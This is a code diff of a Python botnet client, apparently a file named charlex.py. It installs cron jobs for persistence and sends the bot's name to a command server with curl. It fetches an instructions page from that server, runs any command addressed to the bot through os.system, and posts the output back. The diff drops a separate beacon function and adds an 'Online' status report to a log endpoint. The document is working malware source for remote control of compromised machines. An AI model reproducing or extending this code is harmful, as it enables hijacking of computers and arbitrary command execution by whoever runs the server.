@@ -12,19 +12,15 @@ import time
 def cronjobs():
 	whoami = os.getcwd()+"/charlex.py"
 	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
-	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null 2>&1")| crontab -'
 	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null 2>&1")| crontab -'
 	croncheck = 'crontab -l > .cron.bot'
 	startcron = '0 12 * * * '+whoami+' >/dev/null 2>&1'
-	beaconcron = '* * * * * '+whoami+' beacon >/dev/null 2>&1'
 	instructionscron = '* * * * * '+whoami+' instructions >/dev/null 2>&1'
 	os.system(croncheck)
 	with open('.cron.bot', 'r') as f:
 		cronstring = f.read().strip('\n')
 		if startcron not in cronstring:
 			os.system(start)
-		if beaconcron not in cronstring:
-			os.system(beacon)
 		if instructionscron not in cronstring:
 			os.system(instructions)
 	os.system('rm .cron.bot')
@@ -55,27 +51,20 @@ def namecheck():
 			request = 'curl -d '+myname+' http://{IP}:8080/botnames.txt'
 			os.system(request)
 
-#this is a beacon that runs as a cronjob 
-#and sends the current time "Online" and the name of the bot
-def beacon():
-	rmyname = open('/tmp/.bot/name.txt', 'r')
-	x = datetime.now()
-	current_time = x.strftime("%H:%M:%S")
-	data = current_time+' Online '+rmyname.read()
-	request = 'curl -d "'+data+'" http://{IP}:8080/log.txt'
-	os.system(request)
-
 #this checks the instructions page on the server 
 #and does the commands labeled with its name that it sees
 def instructions():
 	dir = '/tmp/.bot/'
 	os.chdir(dir)
-	os.system('curl http://{IP}:8080/instructions.txt > response.txt')
-	os.system("echo 'from_bot_number:' > sendthis.txt")
-	os.system("cat name.txt >> sendthis.txt")
-	os.system("echo ':' >> sendthis.txt")
+	x = datetime.now()
+	current_time = x.strftime("%H:%M:%S")
+	current_date = x.strftime("%m/%d/%Y")
+	myname = open('name.txt', 'r').read()
+	header = "echo 'From Bot #"+myname+" on "+current_date+" at "+current_time+" ' >> sendthis.txt"
+	os.system('curl http://10.0.2.15:8080/instructions.txt > response.txt')
+	os.system(header)
+
 	with open('response.txt') as input_file:
-		myname = open('name.txt', 'r').read()
 		send = 0
 		for line in input_file:
 			commands = line.split()
@@ -85,12 +74,15 @@ def instructions():
 				for thing in commands[1:]:
 					mycommand += thing
 					mycommand += ' '
+				os.system("echo ' _Task_ ' >> sendthis.txt")
 				os.system(mycommand)
-				os.system("echo '_NextTask_' >> sendthis.txt")
+				os.system("echo ' _Task_ ' >> sendthis.txt")
 		if send == 1:
 			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
+		elif send == 0:
+			os.system("echo 'Status is Online' >> sendthis.txt")
+			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/logs.txt')
 	os.system('rm sendthis.txt response.txt')
-
 
 
 
